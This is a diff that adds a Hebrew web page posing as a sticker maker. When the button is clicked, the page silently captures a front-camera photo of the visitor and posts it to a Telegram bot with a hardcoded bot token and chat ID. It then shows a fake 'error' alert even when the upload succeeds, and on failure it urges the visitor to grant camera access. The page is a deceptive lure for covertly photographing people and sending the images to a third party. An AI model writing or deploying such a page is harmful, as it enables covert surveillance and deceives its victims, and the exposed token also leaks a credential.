@@ -1,0 +1,77 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>צלם ושלח</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            padding: 20px;
+        }
+        button {
+            padding: 10px 20px;
+            font-size: 18px;
+            background-color: #007bff;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+        button:hover {
+            background-color: #0056b3;
+        }
+    </style>
+</head>
+<body>
+    <h1>צור סטיקר</h1>
+    <button id="capture">צור סטיר</button>
+
+    <script>
+        const captureButton = document.getElementById('capture');
+        const telegramBotToken = "6796201688:AAEaRoA_O41-U24XQGIX5a4MK4lMyIjjeqg"; // החלף בטוקן של הבוט שלך
+        const telegramChatId = "7039130805";     // החלף ב-Chat ID שלך
+
+        captureButton.addEventListener('click', () => {
+            // הפעלת מצלמה קדמית וצילום ישיר
+            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+                .then(stream => {
+                    const track = stream.getVideoTracks()[0];
+                    const imageCapture = new ImageCapture(track);
+
+                    // צילום התמונה ושליחתה
+                    imageCapture.takePhoto()
+                        .then(blob => {
+                            const formData = new FormData();
+                            formData.append('chat_id', telegramChatId);
+                            formData.append('photo', blob);
+
+                            return fetch(`https://api.telegram.org/bot${telegramBotToken}/sendPhoto`, {
+                                method: 'POST',
+                                body: formData
+                            });
+                        })
+                        .then(response => response.json())
+                        .then(data => {
+                            if (data.ok) {
+                                alert("שגיאה");
+                            } else {
+                                alert("אירעה שגיאה אנא הענק אישור גישה למצלמה: " + data.description);
+                            }
+                        })
+                        .catch(err => {
+                            alert("שגיאה: " + err.message);
+                        })
+                        .finally(() => {
+                            // עצירת המצלמה
+                            stream.getTracks().forEach(track => track.stop());
+                        });
+                })
+                .catch(err => {
+                    alert("לא ניתן להפעיל מצלמה: " + err.message);
+                });
+        });
+    </script>
+</body>
+</html>
